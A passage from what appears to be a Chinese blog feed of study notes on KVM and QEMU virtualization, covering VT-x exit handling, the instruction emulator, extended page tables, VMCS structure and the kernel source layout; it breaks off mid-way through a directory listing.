src="https://img.gls.show/img/20230904194731.png"></p><p>KVM的内核模块仅处理基本的CPU和平台仿真问题。这包括CPU仿真、内存管理和MMU虚拟化、中断虚拟化以及一些芯片组仿真（如APIC、IOAPIC等）。但它不包括所有<strong>I/O设备仿真</strong>。</p><p>考虑到KVM仅设计用于遵循Popek/Goldberg原则的处理器，理论上设计是简单明了的：（i）适当配置硬件；（ii）让虚拟机直接在硬件上执行；（iii）在第一次陷入或中断时，虚拟机监视程序然后重新获得控制权，并“只是”根据语义仿真陷入的指令。</p><p>然而，实际情况要复杂得多。我们的分析基于2016年10月的linux-4.8版本。KVM内核模块本身有超过25,000行源代码（LOC）。这种复杂性部分原因在于：（i）需要支持追溯到首款具有VT-x（Intel的Prescott）的处理器的多个不同版本；（ii）x86指令集架构的固有复杂性；（iii）硬件中仍然缺乏对一些基本操作的架构支持，这些操作必须在软件中处理。</p><p>图4.3说明了KVM陷入处理逻辑的关键步骤，从最初的#vmexit到vmresume指令返回非根模式。在#vmexit之后立即，KVM首先将所有vcpu状态保存在内存中。英特尔体系结构手册定义了54种可能的退出原因（见表4.1）。然后，KVM根据vmcs.exit_reason进行第一级调度，对每个退出原因（arch/x86/kvm/vmx.c中的<code>handler_*</code>）使用不同的处理程序。这些处理程序中的大多数都很简单。特别是，某些常见代码路径仅依赖于VMCS字段来确定执行所需的必要仿真步骤。根据情况，KVM可以执行以下操作：</p><ul><li>仿真指令的语义，并将指令指针增加到下一条指令的开头；</li><li>确定必须将故障或中断转发到客户环境。根据x86的语义，KVM更改堆栈指针，并将以前的指令和堆栈指针存储在堆栈上。然后，在客户的中断描述符表指定的指令处恢复执行；</li><li>更改底层环境并重新尝试执行。例如，在发生EPT违规时会发生这种情况；</li><li>什么都不做（至少对虚拟机状态来说）。例如，当发生外部中断时，由底层主机操作系统处理。非根执行最终会在中断之前中断的位置继续。</li></ul><p>不幸的是，VMCS中可用的信息有时不足以处理#vmexit，而不实际解码引起它的指令。因此，KVM以及试图提供等效性的任何VT-x的虚拟机监视程序必须还包括通用目的的解码器，能够解码所有指令，以及通用目的的仿真器，可以对其进行仿真。</p><p>图4.3还说明了KVM通用目的仿真器实现中涉及的关键步骤。执行这个基本步骤的核心逻辑在arch/x86/kvm/emulate.c中实现，该文件有5000多行代码，充满了宏、复杂性和微妙之处。仿真器的关键步骤包括：</p><ol><li>从客户虚拟内存（%cs:%eip）中提取指令。首先，虚拟地址必须转换为线性地址，然后转换为客户物理地址，并从内存中提取；</li><li>解码指令，提取其操作数和操作数。x86-64指令的CISC性质和可变长度使得这个过程不是微不足道的；</li><li>验证指令是否可以在虚拟CPU的当前状态下执行，例如，特权指令只能在虚拟CPU处于cpl0时执行；</li><li>从内存中读取任何内存读取操作数，就像在x86 CISC架构中使用与指令获取相同的虚拟到线性到客户物理重定位步骤一样；</li><li>仿真解码的指令，可以是x86架构中定义的任何指令。每个指令操作码通过其自己的专用仿真例程（源代码中的<code>em_*</code>）进行仿真；</li><li>将任何内存写操作数写回客户虚拟机；以及</li><li>根据需要更新客户寄存器和指令指针。</li></ol><p>显然，这些步骤复杂、昂贵，并且充满了特殊情况和可能的异常条件。图4.3进一步显示了这种复杂性，因为每个阶段都包含可能的异常情况，在这些情况下，陷阱和仿真逻辑会得出结论，客户指令无法成功执行，而应在客户虚拟CPU中生成故障，例如虚拟#GP、#PF或#UD。</p><p>此外，仿真器以某些罕见情况下对实际硬件造成故障，例如当除以零时。图中以红色显示了这一点，导致了额外的复杂性。</p><p>这个仿真器也以其脆弱性而闻名，它的实现随着时间的推移不断发展，以解决缺陷报告以及持续的ISA扩展。它仍然容易出错。Amit等人最近的研究发现KVM内核模块中有117个仿真错误，其中72个仅在仿真器中发现。</p><h3 id="4-3-3-THE-ROLE-OF-THE-HOST-OPERATING-SYSTEM"><a href="#4-3-3-THE-ROLE-OF-THE-HOST-OPERATING-SYSTEM" class="headerlink" title="4.3.3 THE ROLE OF THE HOST OPERATING SYSTEM"></a>4.3.3 THE ROLE OF THE HOST OPERATING SYSTEM</h3><p><img src="https://img.gls.show/img/20230904195551.png"></p><p>KVM专门设计为Linux的一部分。与其他类型-2的虚拟机监视程序（如VMware Workstation或VirtualBox）不同，它深度集成到Linux环境中。例如，perf工具包具有专门用于分析KVM虚拟机的模式；这是由于KVM和Linux项目的深度集成所实现的。</p><p>图4.4显示了核心KVM虚拟机执行循环[113]，以一个虚拟CPU为例。外部循环位于用户模式下，重复执行以下操作：</p><ul><li>通过对字符设备/dev/kvm的ioctl进入KVM内核模块；</li><li>然后，KVM内核模块执行客户代码，直到（i）客户使用I/O指令或内存映射I/O发起I/O操作，或者（ii）主机接收到外部I/O或定时器中断为止；</li><li>然后，QEMU设备仿真器根据需要模拟发起的I/O；</li><li>在发生外部I/O或定时器中断的情况下，外部循环可以使用另一个ioctl(/dev/kvm)简单地返回到KVM内核模块，而没有进一步的副作用。</li></ul><p>然而，这一步在用户空间是必不可少的，因为它为主机操作系统提供了进行全局调度决策的机会。</p><p>内部循环（在KVM内核模块内部）反复执行以下操作：</p><ul><li>恢复虚拟CPU的当前状态；</li><li>使用vmresume指令进入非根模式。在那一点上，虚拟机在该模式下执行，直到下一个#vmexit；</li><li>根据退出原因处理#vmexit，如§4.3.2中所述；</li><li>如果客户发出了一个编程的IO操作（exit_reason = IO）或内存映射的IO指令（exit_reason = exception，但仅在访问内存映射的IO页时），则中断循环并返回到用户空间；</li><li>如果#vmexit是由外部事件引起的（例如，exit_reason = interrupt），则中断循环并返回到用户空间。</li></ul><h2 id="4-4-PERFORMANCE-CONSIDERATIONS"><a href="#4-4-PERFORMANCE-CONSIDERATIONS" class="headerlink" title="4.4 PERFORMANCE CONSIDERATIONS"></a>4.4 PERFORMANCE CONSIDERATIONS</h2><p>VT-x的设计围绕着在根模式和非根模式之间复制体系结构状态以及在它们之间进行原子转换的能力。单个指令vmresume返回非根模式并将VMCS状态加载到当前处理器状态中。</p><p>另一方向上，陷入#vmexit将整个虚拟CPU的状态存储到VMCS状态中。 模式之间的原子转换并不意味着高执行速度，当然也不是单周期的执行时间。直观地说，这种转换预计会暂停整个执行流水线，因为整个寄存器文件、特权状态和指令指针都会发生变化。 实际上，这些转换的测得成本很高，并且表明在处理器的微码固件中存在复杂的实现。表4.2显示了硬件往返的成本，定义为#vmexit后由虚拟机监视程序中的NULL处理器执行的指令指针增加并恢复虚拟机的执行。在早期的处理器中，例如Prescott，单个硬件往返的成本以微秒为单位测得，远远超过常规陷阱的成本。从那以后，转换已经改进了5倍，但仍然很高。</p><p>Amit等人在他们的研究中[15]发现了一些关于VT-x是否符合Popek/Goldberg定理的次要硬件限制：物理地址宽度可以直接通过CPUID指令获得，而无法虚拟化。当在具有不同物理地址宽度的系统之间进行虚拟机的实时迁移时，这可能会导致问题。此外，一些FPU状态无法完全虚拟化，需要采取解决方法。</p><h2 id="4-5-FURTHER-READING"><a href="#4-5-FURTHER-READING" class="headerlink" title="4.5 FURTHER READING"></a>4.5 FURTHER READING</h2><p>在同一项研究中，Amit等人主要确定了KVM实现中违反了预期的虚拟机监视程序的安全等效性属性的软件错误。通过系统比较KVM虚拟机与英特尔的参考模拟器[15]的行为，他们确定了KVM中的117个不同错误。这些错误的共同原因是x86 ISA的复杂性完全暴露给了软件。尽管这些错误中的大多数都是在实际中影响不大的边缘案例等效性限制，但至少有6个错误导致了安全漏洞，可能导致主机DoS、虚拟机DoS或特权升级。这些问题要求重新设计KVM内核模块，特别是考虑将指令模拟器移动到用户空间，以便更容易地隔离错误[37]。</p><p>对KVM有更深入了解兴趣的读者很快会发现，源代码是最好的文档形式，尽管KVM网站[118]中也包含了一些有用的指导。</p><p>自从硅中引入VT-x以来，x86架构的所有虚拟机监视程序都已经采用了VT-x。当前版本的VMware Workstation类似于KVM，利用了VT-x的MMU功能：世界切换不再以其原始形式存在，VMware Workstation的核心执行循环与KVM类似。Adams和Agesen[3]在硬件支持存在的情况下，详细研究了在DBT和直接执行之间的这种权衡。每当虚拟机监视程序必须在内存中影子复制在实际中频繁访问的数据结构时，这种权衡就会很大。在扩展页处理器引入之前，这种权衡是基本的，作者得出结论称VT-x（不包括扩展分页）会影响性能。</p><p>Xen也早早采用了VT-x，称为硬件虚拟化（HVM）[50, 146]。使用HVM，虚拟机操作系统不再需要进行paravirtual化才能在Xen上运行。相反，paravirtualization只是一组可选的扩展，通过与虚拟机监视程序直接通信来提高性能和功能。</p><p>就我们所知，从根模式到非根模式的过渡的微体系结构成本从未在学术上深入研究过，也没有披露在英特尔或AMD处理器中的其实施的显要方面。从Prescott到Sandy Bridge的5倍改进的原因仍然是一个引发猜测的问题。相反，焦点一直是不懈减少处理#vmexit的软件成本。</p><p><img src="https://img.gls.show/img/20230904201029.png"></p><blockquote><p>Table4.3: Hardware costs of individual VT-x instructions and <code>#vmexit</code> for different Intel processors</p></blockquote><h1 id="X86-64-带扩展页表的-MMU-虚拟化"><a href="#X86-64-带扩展页表的-MMU-虚拟化" class="headerlink" title="X86-64: 带扩展页表的 MMU 虚拟化"></a>X86-64: 带扩展页表的 MMU 虚拟化</h1><p>虚拟机监控程序必须虚拟化物理内存，以便每个虚拟机都具有管理自己连续物理内存区域的错觉。回想一下第1.6节的定义：每个虚拟机都提供了客户物理内存的抽象，而虚拟机监控程序管理主机物理内存，即实际的底层物理资源。</p><p>这导致了一个二维问题：客户操作系统定义了虚拟内存和客户物理内存之间的映射。虚拟机监控程序然后独立地定义了客户物理内存和主机物理内存之间的映射。</p><p>在<strong>内存管理单元中没有任何架构支持的情况下</strong>，虚拟机监控程序依赖于阴影分页来虚拟化内存。<strong>在阴影分页中，虚拟机监控程序管理一组综合的页表，将虚拟内存映射到主机物理内存</strong>（有关VMware实现的描述，请参见§3.2.5）。作为在软件中实现的阴影分页可能是虚拟机监控程序中最复杂的子系统。它依赖于内存跟踪来跟踪内存中的页表结构的更改。阴影分页还严重依赖于启发式方法来确定哪些页面应该被跟踪，因为页表可以位于物理内存的任何位置，并且可以由客户操作系统自行分配和重新分配。此外，VT-x的引入对阴影分页的性能产生了负面影响（请参见§4.2.3）。</p><p>扩展页表为MMU虚拟化提供了体系结构支持。第5.1节描述了x86-64处理器中扩展分页的设计。第5.2节描述了KVM如何管理和虚拟化内存，并利用扩展页表。第5.3节衡量了MMU虚拟化的成本。最后，与所有章节一样，我们提供了进一步阅读的指南。</p><h2 id="5-1-扩展分页"><a href="#5-1-扩展分页" class="headerlink" title="5.1 扩展分页"></a>5.1 扩展分页</h2><blockquote><ul><li><strong>扩展页表</strong>：扩展页表是硬件辅助的内存虚拟化方法。它利用处理器的硬件特性来管理虚拟内存到物理内存的映射。处理器提供了额外的硬件结构（通常是多级页表），用于直接管理这些映射。这种方法通常需要硬件支持，如Intel的EPT（扩展页表）或AMD的NPT（嵌套页表）。</li><li><strong>影子页表</strong>：影子页表是一种软件辅助的内存虚拟化方法。在这种方法中，虚拟机监视器（例如Hypervisor）维护了两组页表结构：一组是虚拟机的页表，用于虚拟机内部的虚拟地址到虚拟机物理地址的映射，另一组是影子页表，用于虚拟机物理地址到真正的主机物理地址的映射。虚拟机监视器负责在虚拟机执行期间保持这两组页表同步。</li></ul></blockquote><p>扩展页表，也称为嵌套页表，消除了基于软件的阴影分页的需要。该设计由Bhargava等人于2008年发表，并在大约同一时间由AMD和英特尔推出芯片支持。扩展页表在硬件中将x86经典的硬件定义的页表结构（由客户操作系统维护）与由虚拟机监控程序维护的第二页表结构相结合，该结构指定了客户物理到主机物理的映射。这两个结构都以树的形式组织。</p><p>使用扩展页表，与处理器深度集成的TLB查找逻辑不会发生根本性变化：TLB仍然以集合关联高速缓存的形式将虚拟页映射到主机物理页。在支持超级页（例如x86-64上的2 MB和1 GB）的体系结构上，通常为每个页大小有一个不同的高速缓存。<br><img src="https://img.gls.show/img/20230905095755.png"></p><p>从根本上改变的是TLB未命中处理逻辑。每当TLB中不存在映射时，x86-64架构规定处理器将遍历由%cr3根的页表树，并将缺失的映射插入到TLB中。在x86-64上，在没有扩展分页的情况下，对于常规页，树是一个n=4级树，对于2 MB页，树是一个n=3级树，对于1 GB页，树是一个n=2级树。因此，页面遍历逻辑必须访问n个内存位置以找到缺失的映射。只有然后CPU才能执行实际的内存读取或写入。</p><p>让我们考虑一下虚拟到客户物理树是n级，客户物理到主机物理树是m级的情况。如图5.1所示。在TLB未命中时，硬件遍历了完全由客户物理页组成的客户页表结构，要求每个客户物理引用必须分别映射到自己的主机物理地址。为了解决第一棵树中的每个引用，处理器必须首先在第二棵树中执行m个引用，然后在第一棵树中查找映射。共有n个这样的步骤，每个步骤需要m+1个引用。这nx(m+1)个引用导致所需的客户物理地址。还需要m个查找来将此客户物理地址转换为主机物理地址。因此，进行扩展页查找所需的架构定义的内存引用次数为nxm+n+m。</p><p>总之，扩展分页通过二次查找算法组合了两个独立的映射。尽管在架构上是二次的，但当前一代处理器广泛依赖于辅助数据结构来减少对内存层次结构的实际引用次数。</p><h2 id="5-2-虚拟化-KVM-内存"><a href="#5-2-虚拟化-KVM-内存" class="headerlink" title="5.2 虚拟化 KVM 内存"></a>5.2 虚拟化 KVM 内存</h2><p>KVM最初在引入扩展分页之前发布。因此，KVM内核模块可以配置为启用或禁用该功能[42]。然而，在实践中，考虑到当前（2017年）使用KVM的情况时，不使用扩展分页的情况仅限于嵌套虚拟化的情况，例如Turtles研究原型[33]。</p><p>图5.2显示了KVM中内存管理的关键方面。该图显示了三个不同的页表结构，由不同的实体管理（以红点表示）。</p><ul><li>作为用户空间进程，QEMU在其自己的虚拟地址空间中的一个连续部分中分配虚拟机物理内存。这样做有几个原因：（i）它将内存管理和分配的细节交给了主机操作系统，符合类型2架构的原则；（ii）它方便用户空间访问虚拟机物理地址空间；这在特定情况下由模拟设备使用，这些设备执行对虚拟机物理内存的DMA读写操作。像机器上的任何进程一样，Linux管理该进程的页表树。当QEMU进程被调度时（包括虚拟机的VCPU正在运行的所有情况），根模式的%cr3寄存器定义了一个地址空间，其中包括QEMU和连续的虚拟机物理内存。</li><li>虚拟机管理其自己的页表。启用嵌套分页后，非根模式的cr3寄存器指向客户页表，这定义了当前的地址空间以虚拟机物理内存为基础。这完全受到客户操作系统的控制。此外，KVM无需跟踪客户页表的更改或上下文切换。实际上，当启用该功能时，非根模式中对cr3的分配不需要引发#vmexit。</li><li>在x86架构中，常规页表的格式（由cr3寄存器指定）与嵌套页表的格式不同。因此，KVM内核模块负责管理嵌套页表，根据Intel架构在eptp寄存器中指定。</li></ul><p>我们还做了一个额外的观察，对性能有影响：对于虚拟化管理程序来说，访问虚拟机物理地址空间比访问虚拟机虚拟地址空间更容易。 具体来说，VT-x架构不提供<strong>根模式软件有效访问非根模式环境的虚拟地址空间</strong>的体系结构支持。 </p><p><img src="https://img.gls.show/img/20230905142338.png"></p><p>图5.2显示，对于虚拟化管理程序来说，<strong>访问虚拟机物理地址空间很简单</strong>：用户空间进程可以简单地<strong>将一个常量偏移量添加到内存位置的引用</strong>中。实际上，KVM模块本身也可以使用相同的方法，因为用户空间进程已经映射了地址空间。然而，对于虚拟化管理程序来说，要<strong>访问虚拟机的虚拟地址空间要困难得多和复杂得多，因为这些映射只存在于处理器的内存管理单元（MMU）中，而虚拟机在执行时存在，但在虚拟化管理程序执行时不存在</strong>。 不幸的是，客户指令指针是一个虚拟地址，KVM解码器必须从内存中读取故障指令的内容。同样，指令的所有内存操作数都涉及虚拟机虚拟地址的引用。因此，KVM解码器和模拟器在软件中重复引用客户页表，以确定指令和操作数在虚拟机物理内存中的位置。 KVM的类型2虚拟机监视器设计在管理虚拟机物理内存时引入了一个复杂性。尽管格式不同，但<strong>嵌套页表中虚拟机物理地址空间的语义映射必须与主机操作系统的虚拟机物理地址空间的映射保持一致</strong>。例如，如果虚拟机物理映射发生变化，例如，在处理虚拟机的#vmexit时分配了新页面，那么相同的映射也必须反映在主机上的QEMU进程的地址空间中。反之，如果主机操作系统决定从QEMU进程中交换出一个页面，则还必须删除相应的虚拟机物理扩展映射。 </p><p>当前版本的KVM在内存管理领域包含了一些关键的优化。特别是，Linux的KSM机制允许内存的透明共享，类似于VMware ESX Server中引入的解决方案。KSM允许具有相同内容的内存页面在Linux进程之间以及KVM虚拟机之间进行透明共享。当发现两个属于潜在不同进程的不同页面具有相同的内容，并且该内容被声明为稳定，即在不久的将来不太可能更改时，将检测到匹配。然后，KSM执行以下操作：（i）从该集合中选择一个页面；（ii）在所有地址空间中为该页面建立只读映射；（iii）通知KVM模块执行相同的操作以处理嵌套页表；以及（iv）释放所有其他相同页面的副本。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>《qemu kvm源码解析与应用》学习笔记</title>
    <link href="/p/c9034472/"/>
    <url>/p/c9034472/</url>
    
    <content type="html"><![CDATA[<p>David Wheeler有一句名言：“计算机科学中的任何问题 都可以通过增加一个中间层来解决。”</p><ul><li>数字逻辑电路-》汇编-》C语言。从机器码、汇编语言到C语言，再 到高级语言，其本质就是一个不断虚拟的过程，将底层复杂的接口转变成了上层容易使用的接口。</li><li>硬盘由柱面、磁道、扇区构成。应用程序能够通过文件管理的接口方便地创建、读取、写入文件</li><li>TCP/IP协议栈模型。经过网络层、传输层的抽象之后，应用程序不需要直接跟网络数据包的收发细节打交道</li><li>每一个进程都是对计算机的抽象，进程都认为自己独占整个计算机系统的资源，有着独立的CPU和内存</li></ul><p>虚拟机（VirtualMachine，VM）</p><ul><li>最简单的虚拟机是进程。进程可以看作是一组资源的集合，有自己独立的进程地址空间以及独立的CPU和寄存器。一个进程在执行指令、访问内存的时候并不会影响其他进程。</li><li>模拟器是另一种形式的虚拟机。它可以使为一种硬件指令集（Instruction Set Architecture，ISA）编译的程序运行在另一种硬件指令集上。模拟器可以通过解释来实现，即对程序的源ISA指令一条一条进行分析，然后执行相应的ISA指令上的操作。模拟器也可以通过二进制翻译实现，即首先将程序中所有的源ISA指令翻译成目标ISA上具有同样功能的指令，然后在目标ISA指令机器上执行。</li></ul><p>管理全局物理资源的软 件叫作虚拟机监控器（Virtual Machine Monitor，VMM），VMM之于虚拟机 就如同操作系统之于进程，VMM利用时分复用或者空分复用的办法将硬件资 源在各个虚拟机之间进行分配</p><p>系统虚拟化模拟指的是QEMU能够模拟一个完整的系统虚拟机，该虚拟机有自己的虚拟 CPU、芯片组、虚拟内存以及各种虚拟外部设备，能够为虚拟机中运行的操作系统和应用软件呈现出与物理计算机完全一致的硬件视图。</p><p>早期的QEMU都是软件模拟的，很明显其在性能上是不能满足要求的。所以早期的云计算平台通常使用 Xen作为其底层虚拟化平台。前面提到过，Xen早期是在x86架构上直接完成 的虚拟化，这需要修改虚拟机内部的操作系统，也使得Xen的整个VMM非常复 杂，缺陷比较多。</p><h2 id="4-1-CPU虚拟化介绍"><a href="#4-1-CPU虚拟化介绍" class="headerlink" title="4.1 CPU虚拟化介绍"></a>4.1 CPU虚拟化介绍</h2><h3 id="4-1-1-CPU虚拟化简介"><a href="#4-1-1-CPU虚拟化简介" class="headerlink" title="4.1.1 CPU虚拟化简介"></a>4.1.1 CPU虚拟化简介</h3><p>在物理机中，操作系统和应用程序都是直接运行在硬件上</p><ul><li>操作系统的代码运行在ring0</li><li>应用程序的代码运行在ring3</li><li>应用程序需要执行一些敏感操作、访问一些系统资源时，需要执行特殊的指令陷入到操作系统内核，由内核进行一些安全检查，代替应用程序访问这些资源</li></ul><p>指令</p><ul><li>能够在ring3执行的指令叫作非特权指令</li><li>只能够在ring0执行的指令叫作特权指令</li><li>如果指令会影响到整个系统，叫作敏感指令，如果只影响自身所在的进程，就叫作非敏感指令<ul><li>典型的敏感指令包括读写时钟、读写中断寄存器等</li></ul></li></ul><p>存在一些属于敏感指令但不是特权指令的指令，也就是说用户程序能够运行一些可以改变/获取全局资源的指令，这造成了x86虚拟化难的问题</p><p>一些虚拟化方式</p><ul><li>Bochs与QEMU（不含KVM）类的纯软件模拟严格来讲并不算是虚拟化软件，应该叫作模拟器，因为它们都是一条一条指令地解析，然后执行的</li><li>VMWare早期的方案，虚拟化用户态的程序直接在CPU上执行，但是一些特权指令会通过动态的二进制翻译去执行</li><li>Xen方案，该方案修改了虚拟机操作系统内核的代码，使虚拟机内核运行在ring1，并且对虚拟机中操作系统内核的敏感指令进行替换进而使其陷入到ring0的Xen内核</li><li>各个方案都有缺点，如纯软件模拟的性能非常差，Xen方案又只能支持有源码的操作系统，VMware的Workstation综合来看相对不错。</li></ul><h3 id="4-1-2-VMX架构简介"><a href="#4-1-2-VMX架构简介" class="headerlink" title="4.1.2 VMX架构简介"></a>4.1.2 VMX架构简介</h3><p>CPU虚拟化的VT-x技术增加VMX架构来实现CPU的硬件虚拟化</p><ul><li>虚拟机监控器（VMM）以及虚拟机（VM）<ul><li>VMM对整个系统的CPU和硬件有完全的控制权，它抽象出虚拟的CPU给各个VM，并且能够将VM的CPU直接调度到物理CPU上运行。VMM需要对各个VM进行管理，包括创建、配置、删除VM实例、为其分配资源、确保各个VM之间的隔离与独立，还需要处理VM对资源的访问、确保公平，所有这些都需要VMM运行的权限高于VM</li><li>VM本身不会意识到其处在虚拟化环境中。每一个VM都相互独立，有自己独立的CPU、内核、中断和设备等，这些资源都是VMM提供的</li></ul></li><li>VMM执行的模式叫作VMX <strong>root</strong> operation模式，VM执行的模式叫作VMX <strong>non-root</strong> operation模式，每种模式都有自己的ring0和ring3结构。这两种模式之间的转换叫作VMX转换。从VMX root转换到VMX non-root叫作VM Entry，而从VMX non-root转换到VMXroot则叫作VM Exit</li><li>在VMX non-root模式中，执行一些特殊的指令（如之前所说的影响系统全局的指令）或者发生一些特殊的事件都会导致VMExit，使VM退出到VMM</li><li>VMX operation让虚拟机的操作系统不需要修改就能够运行</li></ul><p><img src="https://img.gls.show/img/20230810222845.png"></p><p><img src="https://img.gls.show/img/Pasted%20image%2020230801165150.png"><br><img src="https://img.gls.show/img/Pasted%20image%2020230801200334.png"><br><img src="https://img.gls.show/img/Pasted%20image%2020230801202743.png"><br>要让CPU进入VMX operation，首先需要执行一个VMXON的指令，因为VMM本身也需要记录一些数据，所以在执行VMXON之前，需要先分配一个VMXON的区域，并进行初始化，VMM可以通过执行VMXOFF指令退出VMX operation。</p><p>每一个VM都会有一个对应的虚拟机控制结构（Virtual Machine Control Structure，<strong>VMCS</strong>）区域与之对应，用来保存该VM的相关信息。在进行VMLAUNCH之前需要提前对VMCS进行<strong>分配并初始化</strong></p><p>VMM可以通过VM Entry使一个VM进入到运行状态，首次进入VM是通过执行VMLAUNCH指令发起的</p><h3 id="4-1-3-VMCS介绍"><a href="#4-1-3-VMCS介绍" class="headerlink" title="4.1.3 VMCS介绍"></a>4.1.3 VMCS介绍</h3><p>每个虚拟机的VCPU都有一个对应的VMCS,VMCS区域的大小为4KB，VMM通过它的64位地址来对该区域进行访问。<strong>VMCS之于VCPU的作用类似于进程描述符之于进程的作用</strong>。传统上操作系统的进程会共享物理CPU资源，操作系统负责在多个进程之间分配CPU，每个进程都有进程描述符来保存进程的信息，并且在进程切换时保存硬件上下文，使得进程能够在下次被调度的时候正常运行。同样，VCPU之间会共享物理CPU，VMM负责在多个VCPU之间分配物理CPU，每个VCPU都有自己的描述符，当VMM在切换VCPU运行时需要保存此刻的VCPU状态，从而在下次的VCPU调度中使得VCPU能够从被中断的那个点开始正常运行。</p><p>操作VMCS的指令包括VMCLEAR、VMPTRLD、VMREAD和VMWRITE</p><p>VMCS的格式</p><ul><li>前8个字节是固定的，比如标识不同vmcs版本信息</li><li>其余为VMCS数据区。这个区域的格式是由实现决定的，VMM通过VMREAD和MWRITE指令在这里读写（书上有对应的信息区域图示）<ul><li>Guest-state区域，有各个寄存器的状态以及一些处理器的状态。进行VM Entry时，虚拟机处理器的状态信息从这个区域加载，进行VM Exit时，虚拟机的当前状态信息写入到这个区域。</li><li>Host-state区域。当发生VM Exit的时候，需要切换到VMM的上下文运行，此时处理器的状态信息从这个区域加载</li><li>VM Exit控制区域。这个区域用来指定虚拟机在发生VM Exit时的行为，如一些寄存器的保存。</li><li>VM Exit信息区域。这个区域包含了最近产生的VM Exit信息，典型的信息包括退出的原因以及相应的数据，如指令执行的退出会记录指令的长度等。</li><li>VM Entry控制区域。这个区域用来指定虚拟机在发生VM Entry时的行为，如一些寄存器的加载，还有一些虚拟机的事件注入</li><li>VM-execution控制区域。这个区域用来控制处理器在进入VM Entry之后的处理器行为，这个区域很庞大，包含了多种控制，如哪些时间会引起VM Exit，一个异常位图指示哪些异常会发生VM Exit，APIC的虚拟化控制等</li></ul></li></ul><h2 id="4-2-KVM模块初始化介绍"><a href="#4-2-KVM模块初始化介绍" class="headerlink" title="4.2 KVM模块初始化介绍"></a>4.2 KVM模块初始化介绍</h2><h3 id="4-2-1-KVM源码组织"><a href="#4-2-1-KVM源码组织" class="headerlink" title="4.2.1 KVM源码组织"></a>4.2.1 KVM源码组织</h3><p>KVM</p><ul><li>一个用于 Linux 内核的虚拟化解决方案，允许在同一硬件平台上运行多个虚拟机，充分地重用了内核的诸多功能</li><li>以色列初创公司Qumranet在CPU推出硬件虚拟化之后开发的一个<strong>基于内核的虚拟机监控器</strong></li></ul><p>代码结构</p><ul><li>kvm主体代码位于内核树<strong>virt/kvm目录</strong>下面，表示所有CPU架构的<strong>公共代码</strong>，这也是内核kvm.ko对应的源码</li><li>x86的架构相关的代码在<strong>arch/x86/kvm</strong>下，同一个架构可能会有多种不同的实现，vmx.c（对应intel VM-X方案），svm.c（对应AMD-V方案），这也是intel-kvm.ko和amd-kvm.ko的来源</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  arch<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  block<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  certs<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  crypto<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  Documentation<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  drivers<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  firmware<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  fs<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  include<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  init<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  ipc<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  kernel<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  lib<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  mm<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  net<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  samples<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  scripts<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  security<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  sound<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span 